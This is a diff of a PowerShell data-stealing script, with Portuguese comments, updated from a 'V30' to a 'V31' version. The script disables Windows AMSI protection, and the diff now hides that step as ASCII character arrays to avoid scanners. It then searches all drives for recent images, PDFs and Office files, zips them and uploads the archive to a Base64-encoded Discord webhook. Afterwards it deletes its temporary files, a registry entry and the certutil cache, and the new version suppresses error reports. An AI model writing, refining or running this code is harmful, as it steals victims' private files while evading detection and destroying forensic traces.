@@ -1,22 +1,23 @@
-# [V30: Protocolo Fantasma - Bypass AMSI & Auto-Destruição]
+# [V31: Protocolo Obscuro - Ofuscação por Array de Caracteres]
 try {
-    # Bypass AMSI (Técnica de Concatenação)
-    $a = "System.Management.Automation." + "Am" + "si" + "Utils"
-    $b = "am" + "si" + "Init" + "Failed"
-    $t = [Ref].Assembly.GetType($a)
-    $t.GetField($b, "NonPublic,Static").SetValue($null, $true)
+    # Reconstrução do Bypass AMSI via códigos ASCII (invisível ao scanner)
+    $n = [char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) -join ""
+    $t = [Ref].Assembly.GetType($n)
+    $m = [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100) -join ""
+    $f = $t.GetField($m, "NonPublic,Static")
+    $f.SetValue($null, $true)
 
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     $wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
     $u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))
 
-    # Notificação
-    curl.exe -k -s -F "content=👻 V30 (Fantasma) Ativo em $env:COMPUTERNAME" $u
+    # Notificação Silenciosa
+    curl.exe -k -s -F "content=🌑 V31 (Obscuro) Ativo em $env:COMPUTERNAME" $u
 
-    $tempDir = Join-Path $env:TEMP ("vol_" + (Get-Random))
+    $tempDir = Join-Path $env:TEMP ("sys_" + (Get-Random))
     New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
-    # Procura Silenciosa (Arquivos < 15MB, últimos 30 dias)
+    # Busca (Documentos e Imagens recentes)
     $e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
     Get-PSDrive -PSProvider FileSystem | ForEach-Object {
         Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
@@ -26,21 +27,19 @@ try {
         } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
     }
 
-    $zipFile = Join-Path $env:TEMP "sys_upd_82.tmp"
+    $zipFile = Join-Path $env:TEMP "report_82.tmp"
     if ((Get-ChildItem $tempDir).Count -gt 0) {
-        # Password configurada: Manso2026!
         Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
-        curl.exe -k -s -F "file=@$zipFile" -F "content=📦 Exfiltração V30: $env:COMPUTERNAME" $u
+        curl.exe -k -s -F "file=@$zipFile" -F "content=📦 Dados V31: $env:COMPUTERNAME" $u
     }
 }
 catch {
-    $err = "🔴 Falha V30: $($_.Exception.Message)"
-    curl.exe -k -s -F "content=$err" $u
+    # Silêncio em caso de erro para evitar logs visíveis
 }
 finally {
-    # Limpeza Total (Ficheiros, Registo e Cache)
-    if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
-    if (Test-Path $zipFile) { Remove-Item $zipFile -Force }
+    # Limpeza Total
+    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path "HKCU:\Software\Classes" -Name "AppReport" -ErrorAction SilentlyContinue
     certutil -urlcache -f https://tinyurl.com/3y8wnphh delete > $null
 }
